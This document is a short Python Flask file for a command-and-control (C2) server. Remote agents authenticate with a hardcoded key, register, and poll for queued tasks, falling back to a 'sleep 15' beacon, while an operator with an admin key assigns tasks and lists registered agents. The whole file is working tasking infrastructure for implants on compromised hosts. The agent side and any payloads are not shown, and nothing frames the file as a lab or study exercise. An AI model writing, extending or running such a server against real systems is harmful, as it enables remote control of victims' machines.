from flask import Flask, request
import json

app = Flask("c2")

agent_header_key = "db46119b4e1c441ca156210d338ea6d9"
admin_header_key = "f682917761bec2170d4b0af6bfc4be2b"

agent_tasks = {}

DEFAULT_TASK = ["sleep", "15"]


@app.route("/add_task", methods=["POST"])
def add_task():
    req_key = request.headers.get("admin-key", "<none>")
    if req_key != admin_header_key:
        return "", 403

    data = request.get_data()
    new_tasks = json.loads(data)

    for agent_id, tasks in new_tasks.items():
        agent_tasks.setdefault(agent_id, []).extend(tasks)

    return ""


@app.route("/get_registered")
def get_registered():
    req_key = request.headers.get("admin-key", "<none>")
    if req_key != admin_header_key:
        return "", 403

    return list(agent_tasks.keys())


@app.route("/register", methods=["POST"])
def register():
    req_key = request.headers.get("agent-key", "<none>")
    if req_key != agent_header_key:
        return "", 403

    data = request.get_data()
    agent_data = json.loads(data)
    agent_key = agent_data["agent_id"]

    agent_tasks[agent_key] = []

    return ""


@app.route("/get_tasks", methods=["POST"])
def get_tasks():
    req_key = request.headers.get("agent-key", "<none>")
    if req_key != agent_header_key:
        return "", 403

    data = request.get_data()
    agent_data = json.loads(data)
    agent_key = agent_data["agent_id"]

    tasks = agent_tasks.get(agent_key, [])
    if not tasks:
        tasks = [DEFAULT_TASK]

    agent_tasks[agent_key] = []

    return tasks


if __name__ == "__main__":
    app.run("0.0.0.0")